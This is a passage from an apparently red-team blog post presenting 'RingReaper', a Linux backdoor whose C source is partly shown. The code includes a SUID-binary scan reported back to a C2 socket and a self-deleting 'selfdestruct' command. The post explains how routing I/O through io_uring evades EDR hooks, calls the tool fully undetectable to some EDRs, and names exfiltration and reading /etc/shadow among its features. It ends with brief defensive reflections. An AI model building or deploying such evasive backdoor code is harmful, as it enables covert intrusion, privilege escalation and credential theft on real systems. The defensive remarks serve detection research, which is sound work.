</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pos</span> <span class="o">+=</span> <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span> <span class="o">+</span> <span class="n">pos</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="n">pos</span><span class="p">,</span> <span class="s">&#34;Potential SUID binaries:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">((</span><span class="n">entry</span> <span class="o">=</span> <span class="nf">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">&#34;/usr/bin/%s&#34;</span><span class="p">,</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">statx</span> <span class="n">stx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_prep_statx</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">AT_FDCWD</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">STATX_ALL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_submit</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">stx</span><span class="p">.</span><span class="n">stx_mode</span> <span class="o">&amp;</span> <span class="n">S_ISUID</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">pos</span> <span class="o">+=</span> <span class="nf">snprintf</span><span class="p">(</span><span class="n">out</span> <span class="o">+</span> <span class="n">pos</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="n">pos</span><span class="p">,</span> <span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">-</span> <span class="mi">100</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.</p>
<p><code>cmd_selfdestruct</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cmd_selfdestruct</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_uring</span> <span class="o">*</span><span class="n">ring</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sockfd</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span> <span class="o">=</span> <span class="s">&#34;Agent will self-destruct</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">msg</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">exe_path</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">readlink</span><span class="p">(</span><span class="s">&#34;/proc/self/exe&#34;</span><span class="p">,</span> <span class="n">exe_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">exe_path</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">exe_path</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span> <span class="o">=</span> <span class="nf">io_uring_get_sqe</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">io_uring_cqe</span> <span class="o">*</span><span class="n">cqe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_prep_unlinkat</span><span class="p">(</span><span class="n">sqe</span><span class="p">,</span> <span class="n">AT_FDCWD</span><span class="p">,</span> <span class="n">exe_path</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_submit</span><span class="p">(</span><span class="n">ring</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_wait_cqe</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">char</span> <span class="n">err</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nf">snprintf</span><span class="p">(</span><span class="n">err</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">err</span><span class="p">),</span> <span class="s">&#34;Unlink failed: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">cqe</span><span class="o">-&gt;</span><span class="n">res</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="nf">send_all</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">err</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">err</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">io_uring_cqe_seen</span><span class="p">(</span><span class="n">ring</span><span class="p">,</span> <span class="n">cqe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="how-does-the-edr-typically-fail-here">How Does the EDR Typically Fail Here?<a hidden class="anchor" aria-hidden="true" href="#how-does-the-edr-typically-fail-here">#</a></h2>
<p>A standard EDR intercepts:</p>
<ul>
<li>Calls to <code>open</code></li>
<li>Calls to <code>connect</code></li>
<li>Calls to <code>read</code> and <code>write</code></li>
</ul>
<p>This monitoring is usually done via hooks or eBPF. What this agent does is &ldquo;bypass&rdquo; these direct calls using <code>io_uring</code>. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.</p>
<p>In essence, the EDR sees fewer &ldquo;door knocks&rdquo; because <code>io_uring</code> sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.</p>
<h2 id="practical-edr-bypass">Practical EDR Bypass<a hidden class="anchor" aria-hidden="true" href="#practical-edr-bypass">#</a></h2>
<p>With this agent, virtually all network and file operations are handled through <code>io_uring</code>.</p>
<p>So an EDR would need to monitor <code>io_uring_enter</code> and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.</p>
<p>Additionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.</p>
<p>Below is a screenshot from an environment running EDR:</p>
<p><img loading="lazy" src="https://i.imgur.com/ghxr7Iz.png" alt="imgur"  />
</p>
<p><img loading="lazy" src="https://i.imgur.com/ei7hWL7.png" alt="imgur"  />
</p>
<p><img loading="lazy" src="https://i.imgur.com/Kkg9M1d.png" alt="imgur"  />
</p>
<p>RingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read <code>/etc/shadow</code>, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.</p>
<h2 id="python-c2-server-flow">Python C2 Server Flow<a hidden class="anchor" aria-hidden="true" href="#python-c2-server-flow">#</a></h2>
<p>The <code>server.py</code> is quite straightforward:</p>
<ul>
<li>Waits for a connection</li>
<li>Receives commands from a terminal</li>
<li>Sends them to the agent</li>
<li>Displays the response</li>
</ul>
<p>It also supports file uploads (<code>put</code>), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.</p>
<h2 id="defensive-reflections">Defensive Reflections<a hidden class="anchor" aria-hidden="true" href="#defensive-reflections">#</a></h2>
<p>As much as using <code>io_uring</code> to bypass defenses is a clever idea;</p>
<p><strong>There’s no magic:</strong></p>
<p>The kernel still has to execute the <code>io_uring</code> operations. In theory, a well-designed EDR could hook <code>io_uring_enter</code> or instrument internal calls like <code>__io_uring_submit</code>.</p>
<p>eBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor <code>io_uring</code>-related syscalls.</p>
<p>It’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>This agent demonstrates that <code>io_uring</code>, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.<br>
Its asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.</p>
<p>For red teamers, t shows the power of modern evasion techniques.</p>
<p>For defenders, the takeaway is clear: start studying hooks for <code>io_uring</code>, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.</p>
<p>Join in rootkit researchers</p>
<ul>
<li><a href="https://discord.gg/66N5ZQppU7">https://discord.gg/66N5ZQppU7</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/red-team/">Red Team</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/hacking/linux-threat-hunting-persistence/">
    <span class="title">« Prev</span>
    <br>
    <span>Linux Threat Hunting Persistence</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2025 <a href="http://localhost:1313/">0xMatheuZ</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
